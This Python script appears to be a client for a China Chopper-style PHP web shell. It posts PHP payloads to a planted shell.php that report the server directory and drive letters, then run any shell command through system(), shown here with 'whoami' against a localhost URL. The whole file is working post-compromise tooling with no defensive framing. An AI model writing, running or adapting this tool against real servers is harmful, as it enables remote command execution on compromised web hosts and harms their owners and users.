#!/usr/bin/env python
#-*- coding:utf-8 -*-

import request
import re

data = re.compile(r'\-\>\|(?P<res>.*)\|\<\-')

data_pwd = re.compile(r'\-\>\|(?P<res>.*)\[S\](?P<pwd>.*)\[E\]\|\<\-', re.DOTALL)


def init_cmd(url):
    z0 = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");$D=dirname($_SERVER["SCRIPT_FILENAME"]);echo $D."\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir($L.":"))echo($L.":");};echo("|<-");die();'''

    pwd = request.post_data(url, z0=z0)
    content = data.search(pwd).group('res')
    
    pwd = content.strip() + '/'
    
    content = pwd
    pwd = "[%s]$ " % pwd
    return content, pwd

def run_cmd(url,cmd):
    z0 = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");$p=base64_decode($_POST["z1"]);$s=base64_decode($_POST["z2"]);$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c '{$s}'":"/c {$s}";$r="{$p} {$c}";@system($r." 2>&1");;echo("|<-");die();'''
    z1 = "/bin/sh"
    z2 = 'cd "/var/www/";%s;echo [S];pwd;echo [E]' % (cmd,)
    #print z0,z1,z2

    output = request.post_data(url, z0=z0, z1=z1, z2=z2)
    output =  output.replace('\n','')

    #print output
    g = data_pwd.search(output)
    content, pwd = g.group('res'), g.group('pwd')

    pwd = "[%s/]$ " % pwd.strip()

    return content, pwd

if __name__ == '__main__':
    print init_cmd('http://127.0.0.1/yun/shell.php')           # 
    print run_cmd('http://127.0.0.1/yun/shell.php', 'whoami')
